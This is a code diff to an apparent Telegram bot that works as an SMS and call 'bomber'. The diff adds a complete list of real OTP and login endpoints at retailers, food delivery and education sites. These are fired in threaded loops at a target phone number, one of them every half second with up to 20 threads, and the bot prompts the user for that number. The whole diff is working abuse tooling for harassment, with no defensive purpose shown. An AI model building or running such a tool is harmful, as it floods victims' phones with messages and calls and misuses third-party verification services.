@@ -31,7 +31,127 @@ count_lock = threading.Lock()
 start_time = 0
 bomber_active = False
 
-# [Keep all your API configurations here...]
+# Complete API configurations
+api_configurations = [
+    # POST APIs (40 second interval)
+    {
+        'name': 'Samsung OTP',
+        'url': 'https://www.samsung.com/in/api/v1/sso/otp/init',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"user_id": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'More Retail Login',
+        'url': 'https://omni-api.moreretail.in/api/v1/login/',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"hash_key": "XfsoCeXADQA", "phone_number": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'Swiggy Call Verify',
+        'url': 'https://profile.swiggy.com/api/v3/app/request_call_verification',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"mobile": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'OLX Authentication',
+        'url': 'https://www.olx.in/api/auth/authenticate?lang=en-IN',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"method": "call", "phone": f"+91{n}", "language": "en-IN", "grantType": "retry"}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'PropTiger Login',
+        'url': 'https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"contactNumber": n, "domainId": "2"}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'ForexWin OTP',
+        'url': 'https://api.forexwin.co/api/sendOtp',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"phone": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'DocTime OTP',
+        'url': 'https://admin.doctime.com.bd/api/otp/send',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"contact": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'Doubtnut Login',
+        'url': 'https://api.doubtnut.com/v4/student/login',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"is_web": "3", "phone_number": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'Trinkerr OTP',
+        'url': 'https://prod-backend.trinkerr.com/api/v1/web/traders/generateOtpForLogin',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"mobile": n, "otpOperationType": "SignUp"}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'Meesho OTP',
+        'url': 'https://www.meesho.com/api/v1/user/login/request-otp',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"phone_number": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'TLLMS OTP',
+        'url': 'https://identity.tllms.com/api/request_otp',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"feature": "", "phone": f"+91{n}", "type": "sms", "app_client_id": "null"}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    # GET APIs (45 second interval)
+    {
+        'name': 'Glonova Lookup',
+        'url': 'https://glonova.in/',
+        'method': 'GET',
+        'params': lambda n: {'mobile': n},
+        'interval': 45,
+        'threads': 1
+    },
+    # Booming API (continuous)
+    {
+        'name': 'Booming API',
+        'url': 'https://booming-api.vercel.app/',
+        'method': 'GET',
+        'params': lambda n: {'number': n},
+        'interval': 0.5,
+        'threads': 'user_defined'
+    }
+]
 
 def api_request_loop(api_config, number, thread_id=None):
     global message_count, api_counters, api_repeats, bomber_active
@@ -67,7 +187,7 @@ def api_request_loop(api_config, number, thread_id=None):
                     api_repeats[api_name] += 1
                 
         except Exception as e:
-            pass
+            logging.error(f"Error in {api_name} thread {thread_id}: {str(e)}")
         
         time.sleep(api_config['interval'])
 
@@ -95,10 +215,12 @@ def start_bomber(number, boom_threads):
                 daemon=True
             )
             t.start()
+    logging.info(f"Bomber started on {number} with {boom_threads} threads")
 
 def stop_bomber():
     global bomber_active
     bomber_active = False
+    logging.info("Bomber stopped by user")
 
 def display_counters():
     global message_count, api_counters, api_repeats, start_time, bomber_active
@@ -118,7 +240,7 @@ def display_counters():
             repeat = current_repeats.get(api_name, 0)
             output += f"  {api_name.ljust(20)}: {count:,} (Repeat: {repeat})\n"
         
-        print(output)
+        logging.info(output)
         time.sleep(5)
 
 # /start handler
@@ -162,8 +284,8 @@ async def start_bomber_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     await query.answer()
     
     # Ask for phone number
-    await query.edit_message_caption(
-        caption="Please send the target phone number (without +91 or 0):"
+    await query.edit_message_text(
+        "Please send the target phone number (10 digits, without +91 or 0):"
     )
     
     # Store the state that we're waiting for a phone number
@@ -180,14 +302,17 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         # Ask for number of threads
+        keyboard = [
+            [InlineKeyboardButton("5", callback_data=f"threads_5_{phone_number}")],
+            [InlineKeyboardButton("10", callback_data=f"threads_10_{phone_number}")],
+            [InlineKeyboardButton("15", callback_data=f"threads_15_{phone_number}")],
+            [InlineKeyboardButton("20", callback_data=f"threads_20_{phone_number}")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
         await update.message.reply_text(
             "How many threads for the Booming API? (1-20 recommended):",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("5", callback_data=f"threads_5_{phone_number}")],
-                [InlineKeyboardButton("10", callback_data=f"threads_10_{phone_number}")],
-                [InlineKeyboardButton("15", callback_data=f"threads_15_{phone_number}")],
-                [InlineKeyboardButton("20", callback_data=f"threads_20_{phone_number}")]
-            ])
+            reply_markup=reply_markup
         )
         
         # Clear the state
